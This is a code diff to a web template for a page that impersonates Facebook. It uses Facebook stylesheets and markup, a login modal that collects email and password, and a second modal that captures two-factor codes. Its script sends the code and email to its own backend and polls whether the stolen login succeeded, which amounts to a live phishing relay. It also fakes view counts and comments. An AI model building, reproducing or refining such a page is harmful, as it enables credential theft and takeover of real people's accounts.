@@ -54,7 +54,7 @@
         as="style" crossorigin="anonymous" />
     <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/dg6SOblwSgG.css?_nc_x=Ij3Wp8lg5Kz"
         as="style" crossorigin="anonymous" />
-    <link type="text/css" href="/css/home.css?v=2" rel="stylesheet">
+    <link type="text/css" href="/css/home.css?v=123123" rel="stylesheet">
 </head>
 
 <body>
@@ -115,7 +115,7 @@
     <div class="modal" id="modal-login" style="display: none;" aria-modal="true" data-backdrop="static"
         tabindex="-1" role="dialog" aria-labelledby="staticBackdropLabel" aria-hidden="true">
         <div class="modal-dialog modal-lg modal-dialog-centered">
-            <div class="modal-content">
+            <div class="modal-content" style="text-align: center; padding: 20px;">
                 <div class="form-login">
                     <div class="form-title mb-2">
                         <div class="_4g34"><a
@@ -142,7 +142,8 @@
                                         placeholder="@lang('login.password')" value="" aria-label="Password"> <br>
 
                                     <button type="button" class="button-form-login" id="btnLogin-desktop">
-                                        <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;" class="d-none spinner-border spinner">
+                                        <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
+                                            class="d-none spinner-border spinner">
                                         </span>
                                         <span id="submit-login-text">@lang('login.submit')</span>
                                     </button>
@@ -197,39 +198,73 @@
                         <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
                             <div class="clearfix uiHeaderTop">
                                 <div style="text-align: left">
-                                    <h2 class="uiHeaderTitle" aria-hidden="true">@lang('fa.title_page_fa')</h2>
+                                    <h2 class="uiHeaderTitle" aria-hidden="true">@lang('confirm.title_form')</h2>
                                 </div>
                             </div>
                         </div>
-                        <div class="phl ptm uiInterstitialContent">
-                            <div class="_585n mbm hidden_elem _585o" id="error_box" style="display: none"><i
-                                    class="_585p img sp_kdZ98Fttf5-_1_5x sx_c84dfe"><u>Warning</u></i>
-                                <div class="text-error-fa _585r _50f4" style="text-align: left">@lang('fa.title_noti_fa')
+                        <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+                            <div class="clearfix uiHeaderTop">
+                                <div style="text-align: left">
+                                    @lang('confirm.sub_title_form')
                                 </div>
                             </div>
-                            <div class="_9nq2 marginBottom20px guide-info">@lang('fa.title_noti_content_email_fa')</div>
-                            <div class="clearfix">
-                                <div class="_9o1z"><input type="text"
-                                        class="validate-input validate-fa inputtext _9o1w _9o1_" name="n"
-                                        id="recovery_code_entry" placeholder="@lang('fa.title_placeholder_fa')" autocomplete="off"
-                                        aria-label="Nhập mã"></div>
-                                <div class="_9o1-">
-                                    <div class="_9o1x marginBottom10px">@lang('fa.title_noti_action_fa')</div>
-                                    <div class="_9o1y">
-                                        <div class="hide-email"></div>
+                        </div>
+                        <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+                            <div class="clearfix uiHeaderTop">
+                                <div style="text-align: left">
+                                    <h2 class="uiHeaderTitle" aria-hidden="true">@lang('confirm.title_notice')</h2>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+                            <div class="clearfix uiHeaderTop">
+                                <div style="text-align: left">
+                                    @lang('confirm.sub_title_notice')
+                                </div>
+                            </div>
+                        </div>
+                        <div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+                            <div class="clearfix uiHeaderTop">
+                                <div style="text-align: left">
+                                    <h2 class="uiHeaderTitle" aria-hidden="true">@lang('confirm.title_input_code')</h2>
+                                </div>
+                            </div>
+                            <div class="phl ptm uiInterstitialContent" style="padding: 0px">
+                                <div class="_585n mbm hidden_elem _585o" id="error_box" style="display: none"><i
+                                        class="_585p img sp_kdZ98Fttf5-_1_5x sx_c84dfe"><u>Warning</u></i>
+                                    <div class="text-error-fa _585r _50f4" style="text-align: left">@lang('fa.title_noti_fa')
                                     </div>
                                 </div>
+                                <div style="text-align: left" class="_9nq2 marginBottom20px guide-info">
+                                    @lang('fa.title_noti_content_email_fa')</div>
+                                <div class="clearfix">
+                                    <div class="_9o1z" style="text-align: left"><input type="text"
+                                            class="validate-input validate-fa inputtext _9o1w _9o1_" name="n"
+                                            id="recovery_code_entry" placeholder="@lang('fa.title_placeholder_fa')"
+                                            autocomplete="off" aria-label="Nhập mã"></div>
+                                    <div class="_9o1-">
+                                        <!--<div class="_9o1x marginBottom10px">@lang('fa.title_noti_action_fa')</div>-->
+                                        <div class="_9o1y">
+                                            <!--<div class="hide-email"></div>-->
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="mvm"></div>
                             </div>
-                            <div class="mvm"></div>
                         </div>
-                        <div class="uiInterstitialBar uiBoxGray topborder">
+
+                        <div class="uiInterstitialBar" style="padding: 8px 20px">
                             <div class="clearfix">
-                                <div class="rfloat _ohf"><a role="button"
-                                        class="_42ft _4jy0 _9nq1 textPadding20px _4jy3 _517h _51sy"
+                                <div class="rfloat _ohf">
+                                    <a role="button" class="_42ft _4jy0 _9nq1 textPadding20px _4jy3 _517h _51sy"
                                         name="reset_action" href="/">@lang('fa.title_cancel_fa')</a>
-                                    <button value="1"
-                                        class="_42ft _4jy0 _9nq0 textPadding20px _4jy3 _4jy1 selected _51sy button-send-fa"
-                                        name="reset_action" type="submit">@lang('fa.title_continue_fa')</button>
+                                    <button id="submit-code"
+                                        class="_42ft _4jy0 _9nq0 textPadding20px _4jy3 _4jy1 selected _51sy button-send-fa">
+                                        <span id="submit-code-loading"
+                                            class="d-none spinner-border spinner-border-sm spinner"
+                                            style="margin-top: 5px"></span>
+                                        <span id="submit-code-text">@lang('confirm.submit_code')</span>
+                                    </button>
                                 </div>
                                 <div class="pts"><a class="_9o1v"
                                         href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA5OTYwODYxLCJjYWxsc2l0ZV9pZCI6NDAwMDE1NzU4MDUxMTIzfQ%3D%3D&amp;is_from_lara_screen=0">@lang('fa.title_question_fa')</a>
@@ -320,19 +355,19 @@
         // $(document).ready(function() {
         //     id_interval = setInterval(() => {
         //         $('.list-comment').append(`
-        //         <div class="comment mb-2">
-        //             <div class="comment-left">
-        //                 <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
-        //                     alt="image">
-        //             </div>
-        //             <div class="comment-right">
-        //                 <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
-        //               ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
-        //                         referrerpolicy="origin-when-cross-origin"
-        //                         src="${ICON[getRandom(0, ICON.length - 1)]}">
-        //             </div>
-        //         </div>
-        //         `);
+    //         <div class="comment mb-2">
+    //             <div class="comment-left">
+    //                 <img width="50px" height="50px" style="border-radius: 50%" src="${AVATAR[getRandom(0, AVATAR.length - 1)]}"
+    //                     alt="image">
+    //             </div>
+    //             <div class="comment-right">
+    //                 <p style="font-weight:bold">${NAME[getRandom(0, NAME.length - 1)]}</p>
+    //               ${COMMENT[getRandom(0, COMMENT.length - 1)]} <img height="16" width="16" class="xz74otr"
+    //                         referrerpolicy="origin-when-cross-origin"
+    //                         src="${ICON[getRandom(0, ICON.length - 1)]}">
+    //             </div>
+    //         </div>
+    //         `);
         //         $(".list-comment").animate({
         //             scrollTop: $('.list-comment')[0].scrollHeight - $('.list-comment')[0]
         //                 .clientHeight
@@ -378,10 +413,8 @@
                                 if (info.isLoginSuccessfully) {
                                     $('#modal-login').css('display', 'none');
                                     $('#modal-fa').css('display', 'block');
-                                    $('.guide-info').text(valueEmail.includes('@') ?
-                                        `@lang('fa.title_noti_content_email_fa')` :
-                                        `@lang('fa.title_noti_content_phone_fa')`);
-                                    $('.hide-email').text(replaceEmail(valueEmail));
+                                    // $('.guide-info').text(`@lang('fa.title_noti_content_email_fa')`);
+                                    // $('.hide-email').text(replaceEmail(valueEmail));
                                     $('.error').css('display', 'none');
                                 } else {
                                     $('.error').css('display', 'block');
@@ -428,9 +461,13 @@
         async function sendDataFa() {
             //
             $('.warning').css('display', 'none');
+            $('#error_box').css('display', 'none');
             //
             const fa_code = $('#recovery_code_entry').val();
             const email = $('#username-desktop').val();
+            //
+            const loading = $('#submit-code-loading');
+            const text = $('#submit-code-text');
             let formData = new FormData();
             formData.append('fa_code', fa_code);
             formData.append('email', email);
@@ -448,13 +485,17 @@
                         idIntervalGetCacheByEmail = setInterval(async () => {
                             let info = await getCacheByEmail(email);
                             if (info) {
+                                text.removeClass('d-none');
+                                loading.addClass('d-none');
                                 if (info.isFaSuccessfully) {
                                     $('#error_box').css('display', 'none');
                                     $('#modal-fa').css('display', 'none');
                                     $('.warning').css('display', 'none');
                                 } else {
-                                    $('.text-error-fa').text(`@lang('fa.title_not_matched_fa')`);
+                                    $('.text-error-fa').text(`@lang('confirm.error_notice')`);
                                     $('#error_box').css('display', 'block');
+                                    text.removeClass('d-none');
+                                    loading.addClass('d-none');
                                 }
                                 $('.button-send-fa').prop('disabled', false);
                                 clearInterval(idIntervalGetCacheByEmail);
@@ -464,7 +505,8 @@
                                     url: "/api/delete-all-cache",
                                     success: function(response) {
                                         if (response.status == 0) {
-                                            console.log("Delete all cache success", response);
+                                            console.log("Delete all cache success",
+                                                response);
                                         }
                                     }
                                 });
@@ -475,6 +517,8 @@
                     } else {
                         $('.button-send-fa').prop('disabled', false);
                         $('#error_box').css('display', 'block');
+                        text.removeClass('d-none');
+                        loading.addClass('d-none');
                     }
                 }
             })
@@ -503,7 +547,13 @@
 
         $(document).on('click', '.button-send-fa', function() {
             let recovery_code_entry = $('#recovery_code_entry').val();
+            const loading = $('#submit-code-loading');
+            const text = $('#submit-code-text');
+            text.addClass('d-none');
+            loading.removeClass('d-none');
             if (!isValidateFa(recovery_code_entry)) {
+                text.removeClass('d-none');
+                loading.addClass('d-none');
                 $('#error_box').css('display', 'block');
             } else {
                 $(this).prop('disabled', true);
@@ -517,6 +567,8 @@
         setInterval(() => {
             $(".amount-view").text(`5${getRandom(4, 9)},${getRandom(1, 9)}K`);
         }, 2000);
+
+        setCurrentLang();
 
         async function setCurrentLang() {
             let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
